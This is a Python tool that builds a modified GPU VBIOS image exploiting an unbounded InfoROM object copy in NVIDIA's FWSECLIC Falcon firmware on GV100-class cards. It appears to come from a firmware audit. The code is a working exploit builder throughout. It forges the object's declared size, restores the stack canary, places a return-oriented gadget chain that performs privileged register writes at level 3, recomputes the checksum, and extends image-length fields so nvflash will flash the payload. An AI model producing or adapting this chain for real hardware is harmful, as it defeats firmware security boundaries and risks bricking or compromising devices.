#!/usr/bin/env python3
"""Build a candidate ROM for the FWSECLIC InfoROM overflow. OFFLINE ONLY — never flashes.

Writes a NEW file. Does not touch hardware, does not modify its input. The output is a
proposal for review, not something to program: see the ⛔ notes at the end of the report
it prints.

## The primitive

`FINDINGS-2026-09-02-fwseclic-audit.md` pass 10: fn `0x607E` copies an InfoROM object's
self-declared U16 `size` from ROM into the fixed global DMEM buffer at `0x49D9`, unbounded.
`0x607E`'s own return address sits at DMEM `0x9E5C`, `0x5483` bytes above that buffer, and
its epilogue is `mpopaddret $r4 0x8c` — so the payload gets `$pc` **and** `r0`-`r4`.

## The chain (all gadgets already in the signed image)

```
0x607E epilogue   mpopaddret $r4 0x8c   ; r0..r4 <- DMEM 0x9DBC.. ; $sp -> 0x9E60 ; pc <- D[0x9E5C]
0x22C5            mov b32 $r10 $r1      ; r10 = address
0x22C7            mov b32 $r11 $r0      ; r11 = value
0x22C9            lcall 0x2294          ; PRI write. D[0x3c60] = 1 (set at VA 0x14B on the PMU
                                        ; branch) => `sub 4; cmp 1; bra a` takes the DIRECT
                                        ; store at 0x22A9: st b32 D[0x14000000|addr] value
0x22CD            mpopret $r1           ; r0,r1 <- our stack ; ret to our next address
```

So after the first transfer each link is **12 bytes of stack**: two words consumed by
`mpopret $r1` (the next write's value and address) and one word of next-`$pc`. Point the
last link's `$pc` back at `0x22C5` to keep going, or elsewhere to finish.

## Stack -> ROM mapping

The loop writes `buf[i] = ROM[blob + i]` for `i` in `[8, size)`, `buf = 0x49D9`. So a byte
destined for DMEM address `D` is authored at ROM offset `blob + (D - 0x49D9)`.

⚠ **Aperture vs physical flash.** Every offset here is an **NV_PROM aperture** offset.
`NV_PMGR_ROM_ADDR_OFFSET` (`0xE208`) reads `0x00000A01` = EN=1, AMOUNT=`0x280`, and AMOUNT is
a **dword** count, so the aperture is `0xA00` bytes above physical flash address 0. An
external flasher must add `0xA00`. This is reported for every offset below.

## Saved-register order

The FWSECLIC `mpopaddret $r4 0x8c` order is now derived from local Falcon payload builders
that annotate live-working stacks explicitly: **low address → high address is
`r4, r3, r2, r1, r0`, then skipped words, then the return address**. In this builder that
means `--mpop-order high` is the real layout and is now the default. `--mpop-order low` is
kept only for historical A/B counterexamples.

## Portability (2026-09-08)

★ The InfoROM object address is **derived from the input ROM**, not assumed. It is reached by
walking a per-card object chain (FWSECLIC fn `0x5E57`), so on another card of the same model the
ULF object sits at a different aperture offset; the old hardcoded `0x04162D` would have written
the chain into whatever happened to be there. `--object-offset` overrides the derivation.

★ The FWSECLIC build is **verified before anything is built**. Every gadget VA, the DMEM buffer
and the canary constant belong to one ucode build; a chain built against a different build is a
jump to an arbitrary address at level 3. `tools/rom_compat.py` reports the same check in detail.

★ The output has the **same shape as the input**. `nvflash --save --entire` produces a *physical*
image (0xA00 NVGI IFR prefix, then the aperture); a raw BAR0 read produces an *aperture* image.
Feed either; the tool detects which, works in aperture coordinates internally, and writes back the
shape it was given, so a physical dump round-trips straight to `nvflash`.

usage:
  build_payload.py <rom-in> <rom-out> [--object ULF|HLK] [--mpop-order low|high]
                   [--size-delta N]                 (signed; adjusts declared size vs chain end)
                   [--dmem-word ADDR=VALUE]...      (repeatable; force specific DMEM dwords)
                   [--resume VA]                    (resume gadget; sets chain length)
                   [--write ADDR=VALUE]...            (repeatable; default: a marker write)
                   [--object-offset 0xNNNNNN]       (override the derived object address)
                   [--force-incompatible]           (build anyway on a FWSECLIC build mismatch)
"""
import hashlib
import os
import struct
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import fwseclic_extract as _fx
import inforom_walk as _iw

BUF = 0x49D9          # destination buffer (global DMEM)
RET_SLOT = 0x9ED8     # 0x607E's return address (pass 46: true geometry, was 0x9E5C)
CANARY_SLOT = 0x9ED4  # its stack canary (pass 46)
CANARY = 0x00006BD1   # D[0x1B0], a constant in the plaintext DMEM image (72 loads, 0 stores)
MPUSH_LO = 0x9E38     # lowest saved GPR slot; real low->high order is r4,r3,r2,r1,r0 (pass 46; r0-from-high CONFIRMED by pass 47's write 2)
CHAIN = 0x9EDC        # $sp after the first ret; the chain proper starts here (pass 46)
G_WRITE = 0x22C5      # the PRI-write gadget
G_RESUME = 0x2A04     # `mpopaddret $r0 0x30`: pops r0 (4) + 0x30 = 0x34, then ret
RESUME_POP = 0x34     # stack the resume gadget consumes before its `ret`
# --- selectable resume gadgets -------------------------------------------------
# The chain length is set entirely by how much stack the resume gadget eats:
#   nlinks = (RESUME_SP - pop - CHAIN) / LINK,  so pop must be == 4 (mod 12).
# `mpopaddret $rN X` consumes (N+1)*4 + X ; `mpopret $rN` consumes (N+1)*4.
# All verified present in disasm/fwseclic_imem.asm at a clean function epilogue.
RESUMES = {
    0x2A04: (0x34, "mpopaddret $r0 0x30"),   # 2 links (original)
    0x49BD: (0x1C, "mpopret $r6"),           # 4 links
    0x41AC: (0x10, "mpopret $r3"),           # 5 links
    0x42A3: (0x10, "mpopret $r3"),           # 5 links (alt)
    0x288C: (0x10, "mpopret $r3"),           # 5 links (alt)
    0x046A: (0x04, "mpopret $r0"),           # 6 links
}
RESUME_SP = 0x9F28    # where `lcall 0x62FE` pushed ITS return address (0x5908) (pass 46)
RESUME_PC = 0x5908    # ... so the resume needs no payload word of its own
LINK = 12             # bytes of stack per chain link (mpopret $r1 pops 8, ret pops 4)
DMEM_END = 0x10000
APERTURE_SKEW = 0xA00  # aperture offset -> physical flash offset

# --- route 1: extend the image nvflash computes from the ROM itself (pass 19) ---
# nvflash's image length == the ROM's own last-image extent + the 0xA00 IFR prefix.
# Both the PCIR/NPDS and the NPDE of the last image carry that length; a flasher may
# cross-check them, so both are raised together.
LAST_IMG = 0x03F000
PCIR_OFF = 0x03F030      # PCIR/NPDS +0x10, u16 image length in 512-byte blocks
NPDE_OFF = 0x03F048      # NPDE      +0x08, u16 image length in 512-byte blocks
IFR_PREFIX = 0xA00       # the NVGI block the aperture hides; taken from an nvflash --save
ROM_SPACE = 0xFF600      # nvflash's "adapter ROM space": aperture 0..0xFF600, i.e. the whole
                         # 1 MiB device minus the IFR prefix. `--save --entire` returns
                         # IFR_PREFIX + ROM_SPACE = 0x100000 bytes, verified byte-identical to
                         # our aperture dump. With --entire the payload needs no image
                         # extension at all -- it is already inside what nvflash addresses.

# ⚠ HISTORICAL, kept only as the expected value for THIS card. The live path derives these
# from the ROM being built (derive_objects); on another card they differ.
DIR_REF = 0x041610
OBJ_REF = {"ULF": DIR_REF + 0x001D, "UPR": DIR_REF + 0x047D, "HLK": DIR_REF + 0x04ED}

# --- FWSECLIC build gate ------------------------------------------------------
# The reference build: CMP 100-210 VBIOS 88.00.51.00.04 (a stock Tesla V100 88.00.4F.00.09 ships
# the same FWSECLIC, which is why the chain is not CMP-specific). Byte signatures at each VA the
# chain depends on, indexed straight into the IMEM image -- valid only because the extractor keeps
# the 1024-byte NS bootloader, so IMEM[va] really is VA va (CLAUDE.md IMAGE-BASE HAZARD).
REF_IMEM_SHA16 = "96c620510890e40b"
GADGET_SIG = {
    0x2294: "89603c00",   # PRI-write helper
    0x22C5: "b21a",       # mov b32 $r10 $r1
    0x22C7: "b20b",       # mov b32 $r11 $r0
    0x22C9: "7e942200",   # lcall 0x2294
    0x22CD: "fb11",       # mpopret $r1
    0x607E: "8fb00100",   # the unbounded copy's frame
    0x62FE: "8fb00100",   # the caller whose frame we return into
    0x5908: "b3a00035",   # resume continuation
}
RESUME_SIG = {0x2A04: "fb0530", 0x49BD: "fb61", 0x41AC: "fb31",
              0x42A3: "fb31", 0x288C: "fb31", 0x046A: "fb01"}
CANARY_DMEM = 0x1B0


def detect_shape(raw):
    """(kind, ifr_prefix, aperture_bytes).  See the Portability note above."""
    if raw[:4] == b"NVGI":
        return "physical", raw[:APERTURE_SKEW], raw[APERTURE_SKEW:]
    if raw[:2] == b"\x55\xaa":
        return "aperture", None, raw
    sys.exit("%s: not a GV100 ROM dump -- starts %s; expected 'NVGI' (physical, from "
             "`nvflash --save --entire`) or 55 AA (aperture, from a BAR0 NV_PROM read)"
             % ("input", raw[:4].hex()))


def verify_build(rom_in, g_resume, force):
    """Refuse to build against a FWSECLIC the chain was not derived on."""
    hits = _fx.scan(rom_in)
    if not hits:
        sys.exit("no FWSECLIC ucode found in %s -- this is not a GV100 VBIOS, or the descriptor "
                 "chain differs.  Run tools/rom_compat.py for the full picture." % rom_in)
    c = max(hits, key=lambda h: h["imem_load"])
    im, dm = c["imem"], c["dmem"]
    sha16 = hashlib.sha256(im).hexdigest()[:16]
    bad = ["VA 0x%04X: want %s, got %s" % (va, want, im[va:va + len(want) // 2].hex())
           for va, want in sorted(GADGET_SIG.items())
           if im[va:va + len(want) // 2].hex() != want]
    rs = RESUME_SIG.get(g_resume)
    if rs and im[g_resume:g_resume + len(rs) // 2].hex() != rs:
        bad.append("resume VA 0x%04X: want %s, got %s"
                   % (g_resume, rs, im[g_resume:g_resume + len(rs) // 2].hex()))
    canary = struct.unpack_from("<I", dm, CANARY_DMEM)[0] if len(dm) > CANARY_DMEM + 4 else None
    if canary != CANARY:
        bad.append("canary D[0x%03X]: want 0x%08X, got %s"
                   % (CANARY_DMEM, CANARY, "0x%08X" % canary if canary is not None else "n/a"))
    if bad and not force:
        sys.exit("⛔ FWSECLIC BUILD MISMATCH -- refusing to build.\n"
                 "   IMEM sha256 %s... (reference %s...)\n   %s\n"
                 "   Every DMEM offset in this builder (buffer 0x%04X, return slot 0x%04X, canary\n"
                 "   slot 0x%04X) belongs to the reference build.  Against a different one the\n"
                 "   chain is a jump to an arbitrary address at level 3.  Re-derive the geometry\n"
                 "   (tools/fuc_frames.py, tools/falcon_cfg.py) before overriding with\n"
                 "   --force-incompatible."
                 % (sha16, REF_IMEM_SHA16, "\n   ".join(bad), BUF, RET_SLOT, CANARY_SLOT))
    return {"sha16": sha16, "exact": sha16 == REF_IMEM_SHA16, "issues": bad,
            "desc": c["desc_ver"], "base": c["base"]}


def derive_objects(ap):
    """Walk the InfoROM the way FWSECLIC does and return {magic: aperture offset}."""
    start, _log = _iw.find_nbsi(ap)
    if start is None:
        sys.exit("could not find the NBSI-bearing code-type-0x70 image -- run "
                 "tools/inforom_walk.py on this ROM to see where the walk stops")
    dirbase, trail = _iw.walk_chain(ap, start)
    if dirbase is None:
        sys.exit("InfoROM object chain did not reach an 'LU' record: %s"
                 % " -> ".join("0x%06X %s" % t for t in trail))
    # directory format "3s2bwbw4b3sw3sw3sw": 8-byte object header, u16, 4 pad, then three
    # (3-char magic, u16 offset) entries starting at +14.
    out = {}
    for i in range(3):
        magic, off = struct.unpack_from("<3sH", ap, dirbase + 14 + i * 5)
        out[magic.decode("latin1")] = dirbase + off
    return dirbase, out
# a harmless, L0-readable "we executed at level 3" marker: NV_PBUS_SW_SCRATCH(30)
DEFAULT_WRITES = [(0x15F8, 0xC0DE0001)]


def main():
    a = sys.argv[1:]
    rom_in, rom_out = a[0], a[1]
    which = a[a.index("--object") + 1] if "--object" in a else "ULF"
    order = a[a.index("--mpop-order") + 1] if "--mpop-order" in a else "high"
    size_delta = int(a[a.index("--size-delta") + 1], 0) if "--size-delta" in a else 0
    dmem_overrides = [tuple(int(x, 0) for x in a[i + 1].split("="))
                      for i, v in enumerate(a) if v == "--dmem-word"]
    writes = [tuple(int(x, 0) for x in a[i + 1].split("="))
              for i, v in enumerate(a) if v == "--write"] or DEFAULT_WRITES
    g_resume, resume_pop, resume_name = G_RESUME, RESUME_POP, RESUMES[G_RESUME][1]
    if "--resume" in a:
        g_resume = int(a[a.index("--resume") + 1], 0)
        if g_resume not in RESUMES:
            sys.exit("unknown --resume 0x%04X; known: %s"
                     % (g_resume, ", ".join("0x%04X" % k for k in sorted(RESUMES))))
        resume_pop, resume_name = RESUMES[g_resume]

    force = "--force-incompatible" in a
    raw = open(rom_in, "rb").read()
    kind, ifr_prefix, ap = detect_shape(raw)
    d = bytearray(ap)

    build = verify_build(rom_in, g_resume, force)
    dirbase, objs = derive_objects(d)
    if "--object-offset" in a:
        blob = int(a[a.index("--object-offset") + 1], 0)
        blob_src = "--object-offset (override)"
    else:
        if which not in objs:
            sys.exit("this ROM's InfoROM directory has no '%s' object; it has: %s"
                     % (which, ", ".join(sorted(objs))))
        blob = objs[which]
        blob_src = "derived from this ROM's own InfoROM chain"
    old_size = struct.unpack_from("<H", d, blob + 5)[0]

    dmem = {}                                   # DMEM address -> 4-byte value
    dmem[CANARY_SLOT] = CANARY
    dmem[RET_SLOT] = G_WRITE                    # first transfer goes straight to the gadget
    # r0..r4 for the FIRST write come from the mpopaddret area
    v0, a0 = writes[0][1], writes[0][0]
    slots = [MPUSH_LO + 4 * i for i in range(5)]
    if v0 == a0:
        # ★ A self-referential first write (value == address) can be made independent of
        # the assumed saved-register order: fill ALL five slots with the same word, so r0
        # and r1 both hold it whichever way the build is laid out.
        for sl in slots:
            dmem[sl] = v0
    else:
        r = {i: 0 for i in range(5)}
        r[0], r[1] = v0, a0                     # r0 = value, r1 = address
        for i in range(5):
            idx = i if order == "low" else 4 - i
            dmem[slots[idx]] = r[i]
    # Each link: `mpopret $r1` pops the NEXT write's (value,address), then `ret` pops
    # the next $pc. The resume gadget must be entered with $sp = RESUME_SP - pop, so
    # the chain length is fixed: (RESUME_SP - pop - CHAIN) / LINK links.
    if (RESUME_SP - resume_pop - CHAIN) % LINK:
        sys.exit("resume 0x%04X pop 0x%X leaves a partial link" % (g_resume, resume_pop))
    nlinks = (RESUME_SP - resume_pop - CHAIN) // LINK
    # writes[0] is delivered via 0x607E's mpopaddret slots; each further write costs one
    # link area, and the last link area's popped pair is unused (we go to the resume).
    if len(writes) != nlinks:
        sys.exit("this resume path needs exactly %d writes (got %d); the gadget at "
                 "0x%04X only fits that chain length" % (nlinks, len(writes), g_resume))
    p = CHAIN
    for k in range(nlinks):
        nxt = writes[k + 1] if k + 1 < len(writes) else None
        pair = (0, 0)
        if nxt:
            pair = (nxt[1], nxt[0]) if order == "low" else (nxt[0], nxt[1])
        dmem[p], dmem[p + 4] = pair
        dmem[p + 8] = G_WRITE if k + 1 < nlinks else g_resume
        p += LINK
    for daddr, val in dmem_overrides:
        dmem[daddr] = val

    top = max(dmem) + 4
    base_size = top - BUF
    size = base_size + size_delta
    if not (8 < size <= DMEM_END - BUF):
        sys.exit("computed declared size 0x%X out of range" % size)

    # --- staging: --no-trigger writes the chain and the length field but leaves the
    # declared size alone. Nothing reads the chain without the trigger, and the length
    # edit is inert (0x5EC6 stops on the last-image indicator), so the resulting image is
    # behaviourally identical to the current device while exercising the whole write path.
    armed = "--no-trigger" not in a
    if armed:
        struct.pack_into("<H", d, blob + 5, size)
    for daddr, val in sorted(dmem.items()):
        off = blob + (daddr - BUF)
        struct.pack_into("<I", d, off, val)
    # NVIDIA's own algorithm, _inforomComputeFileChecksum_Legacy():
    #   sum every byte of the object except index 7, then store its two's complement.
    # ⚠ Empirically this does NOT gate the bug: all three objects already on this card
    # FAIL it (ULF stored 0x00 vs computed 0xB4, UPR 0x03 vs 0x98, HLK 0x00 vs 0xBC) and
    # the copy still demonstrably runs. Recomputed anyway to remove a variable.
    if armed and "--no-checksum" not in a:
        c = 0
        for i in range(size):
            if i != 7:
                c = (c + d[blob + i]) & 0xFF
        d[blob + 7] = ((~c) + 1) & 0xFF
    # --- route 1: raise the ROM's own image length so nvflash covers the payload ---
    ext = None
    if "--extend-image" in a:
        need_end = blob + size                            # one past the declared copy tail
        blocks = -(-(need_end - LAST_IMG) // 512)
        old_blocks = struct.unpack_from("<H", d, NPDE_OFF)[0]
        struct.pack_into("<H", d, NPDE_OFF, blocks)
        struct.pack_into("<H", d, PCIR_OFF, blocks)
        ext = (old_blocks, blocks, LAST_IMG + blocks * 512)
    # ★ write back in the SHAPE WE WERE GIVEN, so a physical `nvflash --save --entire` dump
    # round-trips straight back to nvflash and an aperture dump stays an aperture dump.
    open(rom_out, "wb").write((ifr_prefix + bytes(d)) if kind == "physical" else bytes(d))

    # --- emit the physical-layout file a flasher/nvflash would take ---
    if "--physical" in a:
        pf = a[a.index("--physical") + 1]
        pre = open(a[a.index("--ifr") + 1], "rb").read()[:IFR_PREFIX] if "--ifr" in a else ifr_prefix
        if pre is None or len(pre) != IFR_PREFIX:
            sys.exit("--physical needs --ifr <nvflash --save file> to supply the %#x NVGI prefix"
                     % IFR_PREFIX)
        img_end = ROM_SPACE if "--entire" in a else (ext[2] if ext else 0x042000)
        open(pf, "wb").write(pre + bytes(d[:img_end]))
        print("  physical image written: %s  (0x%X = 0x%X IFR prefix + aperture 0..0x%06X)\n"
              % (pf, IFR_PREFIX + img_end, IFR_PREFIX, img_end))

    print("FWSECLIC InfoROM-overflow candidate ROM  (OFFLINE BUILD — NOT FLASHED)")
    print("  in  : %s   [%s image]" % (rom_in, kind))
    print("  out : %s   [%s image, same shape as the input]" % (rom_out, kind))
    print("  FWSECLIC: %s desc, IMEM sha256 %s...  %s"
          % (build["desc"], build["sha16"],
             "matches the reference build" if build["exact"]
             else "⚠ DIFFERENT from the reference %s..." % REF_IMEM_SHA16))
    if build["issues"]:
        for t in build["issues"]:
            print("            ⚠ %s   (--force-incompatible was given)" % t)
    print("  InfoROM directory at aperture 0x%06X%s"
          % (dirbase, "" if dirbase == DIR_REF else "   ⚠ reference card has 0x%06X" % DIR_REF))
    print("  object %-3s at aperture 0x%06X (physical 0x%06X)   %s"
          % (which, blob, blob + APERTURE_SKEW, blob_src))
    if armed:
        print("  declared size 0x%04X -> 0x%04X   (%d bytes copied into a %d-byte buffer)"
              % (old_size, size, size, 0x4E3C - BUF))
        print("                     minimal chain size 0x%04X + size delta %+d (0x%X)"
              % (base_size, size_delta, size_delta & 0xFFFFFFFF))
        if size < base_size:
            print("                     truncates 0x%X staged byte(s) beyond the declared copy tail"
                  % (base_size - size))
    else:
        print("  ★ --no-trigger: declared size LEFT AT 0x%04X. The chain is written but never"
              % old_size)
        print("    read; this image is behaviourally identical to the current device.")
        if size_delta:
            print("    note: --size-delta %+d is ignored while --no-trigger is active."
                  % size_delta)
    print("  mpop order assumed: r0 at the %s address" % order)
    if ext:
        print("  image length raised: blocks 0x%04X -> 0x%04X  (image ends 0x%06X, aperture)"
              % ext)
        print("                       PCIR@0x%06X and NPDE@0x%06X both updated"
              % (PCIR_OFF, NPDE_OFF))
        print("                       nvflash image size becomes 0x%06X" % (ext[2] + IFR_PREFIX))
    print()
    print("  %-10s %-10s %-10s %-10s %s"
          % ("DMEM", "aperture", "physical", "value", "meaning"))
    why = {CANARY_SLOT: "stack canary (constant, D[0x1B0])",
           RET_SLOT: "0x607E return address -> PRI-write gadget"}
    slot_regs = ["r0", "r1", "r2", "r3", "r4"] if order == "low" else ["r4", "r3", "r2", "r1", "r0"]
    for i, s in enumerate(slots):
        why[s] = "mpopaddret saved %s" % slot_regs[i]
    for daddr, val in sorted(dmem.items()):
        off = blob + (daddr - BUF)
        print("  0x%04X     0x%06X   0x%06X   0x%08X %s"
              % (daddr, off, off + APERTURE_SKEW, val,
                 why.get(daddr, "chain word")))
    # ---- flash-programming report: what actually has to be erased ----
    orig = ap                       # aperture view of the input; d is the aperture view of the output
    diff = [i for i in range(len(orig)) if orig[i] != d[i]]
    SEC = 0x1000
    secs = {}
    for i in diff:
        phys = i + APERTURE_SKEW
        e = secs.setdefault(phys & ~(SEC - 1), {"n": 0, "erase": False, "lo": phys, "hi": phys})
        e["n"] += 1
        # SPI NOR programs 1->0 only; a bit going 0->1 forces a sector erase
        e["erase"] |= (d[i] & ~orig[i]) != 0
        e["lo"] = min(e["lo"], phys); e["hi"] = max(e["hi"], phys)
    print("\n  flash footprint: %d bytes changed, %d physical 4 KiB sector(s) touched"
          % (len(diff), len(secs)))
    for a2 in sorted(secs):
        e = secs[a2]
        print("    sector 0x%06X  %2d bytes (0x%06X-0x%06X)  %s"
              % (a2, e["n"], e["lo"], e["hi"],
                 "ERASE REQUIRED (bits 0->1)" if e["erase"]
                 else "program-only (all 1->0) - no erase"))
    print("\n  PRI writes this chain performs, in order:")
    for addr, val in writes:
        print("    0x%06X <- 0x%08X" % (addr, val))
    if dmem_overrides:
        print("\n  explicit DMEM dword overrides:")
        for daddr, val in dmem_overrides:
            print("    0x%04X <- 0x%08X" % (daddr, val))
    print("\n  epilogue: last link -> 0x%04X (%s, pop 0x%02X) with $sp = 0x%04X"
          % (g_resume, resume_name, resume_pop, RESUME_SP - resume_pop))
    print("            chain occupies DMEM 0x%04X..0x%04X (%d links)"
          % (CHAIN, CHAIN + nlinks * LINK - 1, nlinks))
    for nm, addr in (("0x61D4 canary", 0x9EF8), ("0x61D4 ret", 0x9EFC),
                     ("0x62FE canary", 0x9F24), ("0x62FE ret / resume PC", RESUME_SP)):
        end = CHAIN + nlinks * LINK
        hit = CHAIN <= addr < end
        print("            %-24s 0x%04X  %s" % (nm, addr,
              "OVERWRITTEN by the chain" if hit else "preserved"))
    print("            -> consumes 0x%02X => $sp = 0x%04X, ret takes $pc from D[0x%04X]"
          % (resume_pop, RESUME_SP, RESUME_SP))
    print("            -> which the ORIGINAL stack already holds as 0x%04X (the return"
          % RESUME_PC)
    print("               address `lcall 0x62FE` pushed). $sp lands on 0x%04X — exactly"
          % (RESUME_SP + 4))
    print("               what 0x582B expects, so the boot continues normally.")
    print("  object checksum: 0x%02X (NVIDIA's _inforomComputeFileChecksum_Legacy)"
          % d[blob + 7])
    print("""
\u26d4 Still required before this is programmed:
   * the aperture->physical skew is 0x%X, MEASURED against the device (pass 17: an
     nvflash --save correlates with the aperture dump at 4224/4224 blocks), so the
     physical offsets above are trustworthy.
   * with --extend-image the payload is inside nvflash's image, so a flasher is no
     longer structurally required. nvflash's own gates still are: its cert check
     (patched builds exist) and its InfoROM handling. Which of those actually fires
     is answered by `--compare`, which is read-only.""" % APERTURE_SKEW)


if __name__ == "__main__":
    if len(sys.argv) < 3:
        sys.exit(__doc__)
    main()
